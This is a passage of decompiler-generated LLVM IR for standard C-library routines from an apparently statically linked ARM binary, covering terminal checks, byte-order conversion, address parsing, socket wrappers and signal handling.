  %v2_152f4 = mul nuw nsw i32 %v3_152ec, 2
  %v2_152dc31 = mul nuw nsw i32 %v2_152dc31.in, 2
  %v4_15300 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 1276) to i32*), align 4
  %v2_15304 = add i32 %v4_15300, %v2_152f4
  %v3_15304 = inttoptr i32 %v2_15304 to i16*
  %v4_15304 = load i16, i16* %v3_15304, align 2
  %v2_15308 = add i32 %v4_15300, %v2_152dc31
  %v3_15308 = inttoptr i32 %v2_15308 to i16*
  %v4_15308 = load i16, i16* %v3_15308, align 2
  %v9_1530c = icmp eq i16 %v4_15308, %v4_15304
  br i1 %v9_1530c, label %dec_label_pc_152d4.backedge, label %dec_label_pc_15314

dec_label_pc_15314:                               ; preds = %dec_label_pc_15300
  %v1_15314 = add i32 %v0_15314.ph, 1
  %v2_15318 = icmp eq i8 %v2_152ec, 0
  br i1 %v2_15318, label %dec_label_pc_15328, label %dec_label_pc_152d4.outer

dec_label_pc_15328:                               ; preds = %dec_label_pc_15314, %bb
  %v1_1532c = phi i32 [ %v0_15314.ph, %bb ], [ 0, %dec_label_pc_15314 ]
  ret i32 %v1_1532c

; uselistorder directives
  uselistorder i8 %v2_152d4, { 2, 1, 0 }
  uselistorder i32 %v0_152f829, { 1, 0 }
  uselistorder i32 %v0_15314.ph, { 2, 3, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_152d4.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_152ec, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  %v2_15340 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_15340, i32* @r1, align 4
  %v0_15344 = call i32 @__GI_tcgetattr()
  %v1_15348 = sub i32 1, %v0_15344
  %v2_15348 = icmp ult i32 %v0_15344, 2
  br i1 %v2_15348, label %bb5, label %bb

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v1_15358 = phi i32 [ %v1_15348, %entry ], [ 0, %bb ]
  ret i32 %v1_15358

; uselistorder directives
  uselistorder i32 %v0_15344, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_3()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_1535c = load i32, i32* @r4, align 4
  %v6_1535c = load i32, i32* @r5, align 4
  %v2_15364 = ptrtoint i32* %stack_var_-52 to i32
  %v0_15368 = load i32, i32* @r1, align 4
  store i32 %v0_15368, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_15374 = load i32, i32* @r0, align 4
  %v3_15374 = call i32 @ioctl(i32 %v0_15374, i32 21505, i32 %v2_15364)
  store i32 %v3_15374, i32* %r0.global-to-local, align 4
  store i32 %v3_15374, i32* @r5, align 4
  %v2_15378 = icmp eq i32 %v3_15374, 0
  br i1 %v2_15378, label %dec_label_pc_15380, label %dec_label_pc_153c4

dec_label_pc_15380:                               ; preds = %entry
  %v4_1538c = zext i8 %tmp to i32
  store i32 %v4_1538c, i32* @ip, align 4
  %v3_15390 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_15390, i32* @r3, align 4
  %v1_15394 = load i32, i32* @r4, align 4
  %v2_15394 = add i32 %v1_15394, 4
  %v3_15394 = inttoptr i32 %v2_15394 to i32*
  %v0_15398 = load i32, i32* %r1.global-to-local, align 4
  %v1_15398 = load i32, i32* @r4, align 4
  %v2_15398 = add i32 %v1_15398, 8
  %v3_15398 = inttoptr i32 %v2_15398 to i32*
  store i32 %v0_15398, i32* %v3_15398, align 4
  %v0_1539c = load i32, i32* %r0.global-to-local, align 4
  %v1_1539c = load i32, i32* @r4, align 4
  %v2_1539c = add i32 %v1_1539c, 12
  %v3_1539c = inttoptr i32 %v2_1539c to i32*
  store i32 %v0_1539c, i32* %v3_1539c, align 4
  %v2_153a0 = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_153a0, i32* @r1, align 4
  %v1_153a8 = load i32, i32* @r4, align 4
  %v2_153a8 = inttoptr i32 %v1_153a8 to i32*
  store i32 %v3_15390, i32* %v2_153a8, align 4
  %v0_153ac = load i32, i32* @ip, align 4
  %v1_153ac = trunc i32 %v0_153ac to i8
  %v2_153ac = load i32, i32* @r4, align 4
  %v3_153ac = add i32 %v2_153ac, 16
  %v4_153ac = inttoptr i32 %v3_153ac to i8*
  store i8 %v1_153ac, i8* %v4_153ac, align 1
  %v0_153b0 = load i32, i32* @r4, align 4
  %v1_153b0 = add i32 %v0_153b0, 17
  store i32 %v1_153b0, i32* %r0.global-to-local, align 4
  %v4_153b4 = call i32 @__GI_mempcpy(i32 %v1_153b0, i32 %v2_153a0, i32 19, i32 %v3_15390)
  store i32 %v4_153b4, i32* %r0.global-to-local, align 4
  %v0_153b8 = load i32, i32* @r5, align 4
  store i32 %v0_153b8, i32* %r1.global-to-local, align 4
  store i32 13, i32* @r2, align 4
  %v2_153c0 = inttoptr i32 %v4_153b4 to i8*
  %v3_153c0 = call i32 @__GI_memset(i8* %v2_153c0, i32 %v0_153b8)
  store i32 %v3_153c0, i32* %r0.global-to-local, align 4
  %v0_153c4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_153c4

dec_label_pc_153c4:                               ; preds = %entry, %dec_label_pc_15380
  %v0_153c4 = phi i32 [ %v3_15374, %entry ], [ %v0_153c4.pre, %dec_label_pc_15380 ]
  store i32 %v0_153c4, i32* %r0.global-to-local, align 4
  store i32 %v3_1535c, i32* @r4, align 4
  store i32 %v6_1535c, i32* @r5, align 4
  ret i32 %v0_153c4

; uselistorder directives
  uselistorder i32 %v0_153c4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder label %dec_label_pc_153c4, { 1, 0 }
}

define i32 @__GI_htons(i32 %arg1) local_unnamed_addr {
entry:
  %v3_153d8 = udiv i32 %arg1, 256
  %v1_153dc = mul i32 %arg1, 256
  %v4_153e0 = and i32 %v1_153dc, 65280
  %v5_153e0 = or i32 %v4_153e0, %v3_153d8
  ret i32 %v5_153e0
}

define i32 @__GI_htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v5_15400 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_15400
}

define i32 @__GI_ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %v3_15408 = udiv i32 %arg1, 256
  %v1_1540c = mul i32 %arg1, 256
  %v4_15410 = and i32 %v1_1540c, 65280
  %v5_15410 = or i32 %v4_15410, %v3_15408
  ret i32 %v5_15410
}

define i32 @__GI_ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v5_15430 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_15430
}

define i32 @__GI_inet_ntoa_r() local_unnamed_addr {
entry:
  %v3_15438 = load i32, i32* @r4, align 4
  %v6_15438 = load i32, i32* @r5, align 4
  %v9_15438 = load i32, i32* @r6, align 4
  %v12_15438 = load i32, i32* @r7, align 4
  %v15_15438 = load i32, i32* @r8, align 4
  %v18_15438 = load i32, i32* @sb, align 4
  %v21_15438 = load i32, i32* @sl, align 4
  %v24_15438 = load i32, i32* @fp, align 4
  %v0_1543c = load i32, i32* @r0, align 4
  %v5_15458 = call i32 @llvm.bswap.i32(i32 %v0_1543c)
  %v0_1545c = load i32, i32* @r1, align 4
  %v1_1545c = add i32 %v0_1545c, 15
  store i32 %v1_1545c, i32* @r1, align 4
  store i32 0, i32* @r6, align 4
  store i32 255, i32* @r7, align 4
  store i32 46, i32* @sl, align 4
  br label %dec_label_pc_15498

dec_label_pc_1547c:                               ; preds = %dec_label_pc_15498
  %v1_15484 = inttoptr i32 %v0_154b4 to i8*
  %v2_15484 = call i32 @_uintmaxtostr(i8* %v1_15484)
  %v0_15488 = load i32, i32* @r6, align 4
  %v2_15488 = icmp eq i32 %v0_15488, 0
  %v1_1548c = add i32 %v2_15484, -1
  store i32 %v1_1548c, i32* @r1, align 4
  br i1 %v2_15488, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_1547c
  %v1_15490 = load i32, i32* @sl, align 4
  %v2_15490 = trunc i32 %v1_15490 to i8
  %v4_15490 = inttoptr i32 %v0_15488 to i8*
  store i8 %v2_15490, i8* %v4_15490, align 1
  %v0_15494.pre = load i32, i32* @r1, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_1547c, %bb
  %v0_15494 = phi i32 [ %v1_1548c, %dec_label_pc_1547c ], [ %v0_15494.pre, %bb ]
  store i32 %v0_15494, i32* @r6, align 4
  %v0_15498.pre = load i32, i32* @r5, align 4
  %v0_1549c.pre = load i32, i32* @r7, align 4
  %v1_1549c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15498

dec_label_pc_15498:                               ; preds = %entry, %bb17
  %v0_154b4 = phi i32 [ %v1_1545c, %entry ], [ %v0_15494, %bb17 ]
  %v1_1549c = phi i32 [ %v5_15458, %entry ], [ %v1_1549c.pre, %bb17 ]
  %v0_1549c = phi i32 [ 255, %entry ], [ %v0_1549c.pre, %bb17 ]
  %v0_154ac = phi i32 [ 0, %entry ], [ %v0_15498.pre, %bb17 ]
  %v7_15498 = icmp eq i32 %v0_154ac, 3
  store i1 %v7_15498, i1* @cpsr_z, align 1
  %v2_1549c = and i32 %v0_1549c, %v1_1549c
  store i32 %v2_1549c, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v3_154a8 = udiv i32 %v1_1549c, 256
  store i32 %v3_154a8, i32* @r4, align 4
  %v1_154ac = add i32 %v0_154ac, 1
  store i32 %v1_154ac, i32* @r5, align 4
  %v7_154b0 = icmp sgt i32 %v0_154ac, 3
  br i1 %v7_154b0, label %dec_label_pc_154b4, label %dec_label_pc_1547c

dec_label_pc_154b4:                               ; preds = %dec_label_pc_15498
  %v1_154b4 = add i32 %v0_154b4, 1
  store i32 %v3_15438, i32* @r4, align 4
  store i32 %v6_15438, i32* @r5, align 4
  store i32 %v9_15438, i32* @r6, align 4
  store i32 %v12_15438, i32* @r7, align 4
  store i32 %v15_15438, i32* @r8, align 4
  store i32 %v18_15438, i32* @sb, align 4
  store i32 %v21_15438, i32* @sl, align 4
  store i32 %v24_15438, i32* @fp, align 4
  ret i32 %v1_154b4

; uselistorder directives
  uselistorder i32 %v0_154ac, { 2, 0, 1 }
  uselistorder i32 %v0_15494, { 1, 0 }
  uselistorder i32 (i8*)* @_uintmaxtostr, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15498, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  store i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 25948), i32* @r1, align 4
  %v0_154d4 = call i32 @__GI_inet_ntoa_r()
  %v0_154d8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_154d8, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_154dc = load i32, i32* @ip, align 4
  %v3_154dc = load i32, i32* @r5, align 4
  %v8_154dc = ashr i32 %v2_154dc, %v3_154dc
  %v9_154dc = and i32 %v8_154dc, %v0_154d4
  store i32 %v9_154dc, i32* @r6, align 4
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  ret i32 %v0_154d4

; uselistorder directives
  uselistorder i32 %v0_154d4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_154e8 = ptrtoint i32* %stack_var_-12 to i32
  %v0_154ec = load i32, i32* @r0, align 4
  %v2_154ec = inttoptr i32 %v0_154ec to i8*
  %v3_154ec = call i32 @inet_aton(i8* %v2_154ec, i32 %v2_154e8)
  %v2_154f0 = icmp eq i32 %v3_154ec, 0
  %v4_154f4 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_154f0, i32 -1, i32 %v4_154f4
  ret i32 %storemerge
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  store i32 2, i32* @r1, align 4
  %v0_15514 = call i32 @__GI_gethostbyname2()
  ret i32 %v0_15514
}

define i32 @__GI_gethostbyname2() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_15524 = load i32, i32* @r4, align 4
  %v6_15524 = load i32, i32* @r5, align 4
  %v0_1552c = load i32, i32* @r0, align 4
  store i32 %v0_1552c, i32* @r4, align 4
  %v0_15530 = load i32, i32* @r1, align 4
  store i32 %v0_15530, i32* @r5, align 4
  %v0_15534 = call i32 @__GI___h_errno_location()
  %v0_1555c = load i32, i32* @r4, align 4
  %v2_15560 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_15560, i32* @ip, align 4
  %v0_15564 = load i32, i32* @r5, align 4
  %v8_1556c = call i32 @gethostbyname2_r(i32 %v0_1555c, i32 %v0_15564, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 26404) to i32*), i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 25964), i32 440, i32 %v2_15560, i32 %v0_15534)
  %v3_15570 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_15524, i32* @r4, align 4
  store i32 %v6_15524, i32* @r5, align 4
  ret i32 %v3_15570
}

define i32 @function_15584(i32 %arg1) local_unnamed_addr {
dec_label_pc_15584:
  %v0_15584 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15584, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_15584
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_15584, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1558c = load i32, i32* @r7, align 4
  store i32 %v3_1558c, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_155b4, label %dec_label_pc_155a4

dec_label_pc_155a4:                               ; preds = %entry
  %v0_155a4 = call i32 @__GI___errno_location()
  %v0_155a8 = load i32, i32* %r7.global-to-local, align 4
  %v1_155a8 = sub i32 0, %v0_155a8
  %v2_155ac = inttoptr i32 %v0_155a4 to i32*
  store i32 %v1_155a8, i32* %v2_155ac, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_155b8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_155b4

dec_label_pc_155b4:                               ; preds = %entry, %dec_label_pc_155a4
  %v2_155b8 = phi i32 [ %v3_1558c, %entry ], [ %v2_155b8.pre, %dec_label_pc_155a4 ]
  %v0_155b4 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_155a4 ]
  store i32 %v2_155b8, i32* @r7, align 4
  ret i32 %v0_155b4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_155b4, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_155c4 = load i32, i32* @r7, align 4
  store i32 %v3_155c4, i32* %stack_var_-8, align 4
  %v0_155d0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_155d0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_155d0, -4095
  br i1 %tmp, label %dec_label_pc_155f0, label %dec_label_pc_155e0

dec_label_pc_155e0:                               ; preds = %entry
  %v0_155e0 = call i32 @__GI___errno_location()
  %v0_155e4 = load i32, i32* %r7.global-to-local, align 4
  %v1_155e4 = sub i32 0, %v0_155e4
  %v2_155e8 = inttoptr i32 %v0_155e0 to i32*
  store i32 %v1_155e4, i32* %v2_155e8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_155f0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_155f0

dec_label_pc_155f0:                               ; preds = %entry, %dec_label_pc_155e0
  %v1_155f4 = phi i32 [ %v0_155d0, %entry ], [ -1, %dec_label_pc_155e0 ]
  %v2_155f0 = phi i32 [ %v3_155c4, %entry ], [ %v2_155f0.pre, %dec_label_pc_155e0 ]
  store i32 %v2_155f0, i32* @r7, align 4
  ret i32 %v1_155f4

; uselistorder directives
  uselistorder i32 %v0_155d0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_155f0, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_15630, label %dec_label_pc_15620

dec_label_pc_15620:                               ; preds = %entry
  %v0_15620 = call i32 @__GI___errno_location()
  %v0_15624 = load i32, i32* %r4.global-to-local, align 4
  %v1_15624 = sub i32 0, %v0_15624
  %v2_15628 = inttoptr i32 %v0_15620 to i32*
  store i32 %v1_15624, i32* %v2_15628, align 4
  br label %dec_label_pc_15630

dec_label_pc_15630:                               ; preds = %entry, %dec_label_pc_15620
  %v1_15638 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_15620 ]
  ret i32 %v1_15638

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15630, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15640 = load i32, i32* @r7, align 4
  store i32 %v3_15640, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_15668, label %dec_label_pc_15658

dec_label_pc_15658:                               ; preds = %entry
  %v0_15658 = call i32 @__GI___errno_location()
  %v0_1565c = load i32, i32* %r7.global-to-local, align 4
  %v1_1565c = sub i32 0, %v0_1565c
  %v2_15660 = inttoptr i32 %v0_15658 to i32*
  store i32 %v1_1565c, i32* %v2_15660, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_1566c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15668

dec_label_pc_15668:                               ; preds = %entry, %dec_label_pc_15658
  %v2_1566c = phi i32 [ %v3_15640, %entry ], [ %v2_1566c.pre, %dec_label_pc_15658 ]
  %v0_15668 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_15658 ]
  store i32 %v2_1566c, i32* @r7, align 4
  ret i32 %v0_15668

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15668, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15678 = load i32, i32* @r7, align 4
  store i32 %v3_15678, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_156a0, label %dec_label_pc_15690

dec_label_pc_15690:                               ; preds = %entry
  %v0_15690 = call i32 @__GI___errno_location()
  %v0_15694 = load i32, i32* %r7.global-to-local, align 4
  %v1_15694 = sub i32 0, %v0_15694
  %v2_15698 = inttoptr i32 %v0_15690 to i32*
  store i32 %v1_15694, i32* %v2_15698, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_156a4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_156a0

dec_label_pc_156a0:                               ; preds = %entry, %dec_label_pc_15690
  %v2_156a4 = phi i32 [ %v3_15678, %entry ], [ %v2_156a4.pre, %dec_label_pc_15690 ]
  %v0_156a0 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_15690 ]
  store i32 %v2_156a4, i32* @r7, align 4
  ret i32 %v0_156a0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_156a0, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_156b0 = load i32, i32* @r4, align 4
  store i32 %v3_156b0, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_156e0, label %dec_label_pc_156d0

dec_label_pc_156d0:                               ; preds = %entry
  %v0_156d0 = call i32 @__GI___errno_location()
  %v0_156d4 = load i32, i32* %r4.global-to-local, align 4
  %v1_156d4 = sub i32 0, %v0_156d4
  %v2_156d8 = inttoptr i32 %v0_156d0 to i32*
  store i32 %v1_156d4, i32* %v2_156d8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_156e4.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_156e0

dec_label_pc_156e0:                               ; preds = %entry, %dec_label_pc_156d0
  %v2_156e4 = phi i32 [ %v3_156b0, %entry ], [ %v2_156e4.pre, %dec_label_pc_156d0 ]
  %v0_156e0 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_156d0 ]
  store i32 %v2_156e4, i32* @r4, align 4
  ret i32 %v0_156e0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_156e0, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_15724, label %dec_label_pc_15714

dec_label_pc_15714:                               ; preds = %entry
  %v0_15714 = call i32 @__GI___errno_location()
  %v0_15718 = load i32, i32* %r4.global-to-local, align 4
  %v1_15718 = sub i32 0, %v0_15718
  %v2_1571c = inttoptr i32 %v0_15714 to i32*
  store i32 %v1_15718, i32* %v2_1571c, align 4
  br label %dec_label_pc_15724

dec_label_pc_15724:                               ; preds = %entry, %dec_label_pc_15714
  %v1_1572c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_15714 ]
  ret i32 %v1_1572c

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15724, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15734 = load i32, i32* @r7, align 4
  store i32 %v3_15734, i32* %stack_var_-8, align 4
  %v0_15740 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15740, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_15740, -4095
  br i1 %tmp, label %dec_label_pc_15760, label %dec_label_pc_15750

dec_label_pc_15750:                               ; preds = %entry
  %v0_15750 = call i32 @__GI___errno_location()
  %v0_15754 = load i32, i32* %r7.global-to-local, align 4
  %v1_15754 = sub i32 0, %v0_15754
  %v2_15758 = inttoptr i32 %v0_15750 to i32*
  store i32 %v1_15754, i32* %v2_15758, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_15760.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15760

dec_label_pc_15760:                               ; preds = %entry, %dec_label_pc_15750
  %v1_15764 = phi i32 [ %v0_15740, %entry ], [ -1, %dec_label_pc_15750 ]
  %v2_15760 = phi i32 [ %v3_15734, %entry ], [ %v2_15760.pre, %dec_label_pc_15750 ]
  store i32 %v2_15760, i32* @r7, align 4
  ret i32 %v1_15764

; uselistorder directives
  uselistorder i32 %v0_15740, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15760, { 1, 0 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v3_1576c = load i32, i32* @r4, align 4
  %v0_15774 = call i32 @__GI_getpid()
  %v2_1577c = call i32 @kill(i32 %v0_15774, i32 %arg1)
  store i32 %v3_1576c, i32* @r4, align 4
  ret i32 %v2_1577c

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 0, 2, 1 }
  uselistorder i32 ()* @__GI_getpid, { 0, 3, 2, 1 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r1, align 4
  %tmp4 = icmp slt i32 %arg1, 1
  br i1 %tmp4, label %dec_label_pc_157a0, label %dec_label_pc_15798

dec_label_pc_15798:                               ; preds = %entry
  %v7_1579c = icmp slt i32 %arg1, 65
  br i1 %v7_1579c, label %dec_label_pc_157b4, label %dec_label_pc_157a0

dec_label_pc_157a0:                               ; preds = %dec_label_pc_15798, %entry
  %v0_157a0 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_157ac = inttoptr i32 %v0_157a0 to i32*
  store i32 22, i32* %v2_157ac, align 4
  %v0_157bc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_157bc

dec_label_pc_157b4:                               ; preds = %dec_label_pc_15798
  %v0_157b4 = call i32 @__sigaddset()
  store i32 %v0_157b4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_157bc

dec_label_pc_157bc:                               ; preds = %dec_label_pc_157a0, %dec_label_pc_157b4
  %v0_157bc = phi i32 [ %v0_157bc.pre, %dec_label_pc_157a0 ], [ %v0_157b4, %dec_label_pc_157b4 ]
  ret i32 %v0_157bc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_157bc, { 1, 0 }
}

define i32 @sigemptyset(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_157d4 = add i32 %tmp, 4
  %v3_157d4 = inttoptr i32 %v2_157d4 to i32*
  store i32 0, i32* %v3_157d4, align 4
  %v1_157d8 = load i32, i32* %r3.global-to-local, align 4
  %v2_157d8 = inttoptr i32 %v1_157d8 to i32*
  store i32 0, i32* %v2_157d8, align 4
  ret i32 0
}

define i32 @bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_157e0 = load i32, i32* @r4, align 4
  store i32 %v3_157e0, i32* %stack_var_-16, align 4
  %v6_157e0 = load i32, i32* @r5, align 4
  %v9_157e0 = load i32, i32* @r6, align 4
  %v7_157e8 = icmp eq i32 %arg2, -1
  br i1 %v7_157e8, label %.thread4, label %bb

.thread4:                                         ; preds = %entry
  br label %.thread16

bb:                                               ; preds = %entry
  %v2_157f0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_1580c

.thread16:                                        ; preds = %bb, %.thread4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15814

dec_label_pc_1580c:                               ; preds = %bb
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* @r6, align 4
  %v7_15810 = icmp slt i32 %arg1, 65
  br i1 %v7_15810, label %dec_label_pc_15828, label %dec_label_pc_15814

dec_label_pc_15814:                               ; preds = %.thread16, %dec_label_pc_1580c
  %v0_15814 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_15820 = inttoptr i32 %v0_15814 to i32*
  store i32 22, i32* %v2_15820, align 4
  %v0_15880.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb33

dec_label_pc_15828:                               ; preds = %dec_label_pc_1580c
  %v2_15828 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_15828, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_15830 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_15830, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
